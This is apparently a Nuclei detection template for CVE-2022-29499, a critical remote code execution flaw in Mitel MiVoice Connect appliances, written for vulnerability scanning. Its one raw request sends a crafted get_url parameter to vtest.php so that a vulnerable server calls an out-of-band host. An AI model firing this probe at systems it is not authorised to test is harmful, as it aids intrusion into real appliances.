id: CVE-2022-29499

info:
  name: Mitel MiVoice Connect - Remote Code Execution
  author: dmartyn
  severity: critical
  description: |
    The Service Appliance component in Mitel MiVoice Connect through 19.2 SP3 allows remote code execution because of incorrect data validation. The Service Appliances are SA 100, SA 400, and Virtual SA.
  reference:
    - https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002
    - https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/
    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/
    - https://github.com/Ostorlab/KEV
    - https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-29499
    cwe-id: CWE-20
    epss-score: 0.03545
    epss-percentile: 0.91412
    cpe: cpe:2.3:a:mitel:mivoice_connect:*:*:*:*:*:*:*:*
  metadata:
    vendor: mitel
    product: mivoice_connect
  tags: cve,cve2023,oast,rce,ssrf,mitel,mivoice,kev

requests:
  - raw:
      - |
        GET /scripts/vtest.php?get_url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
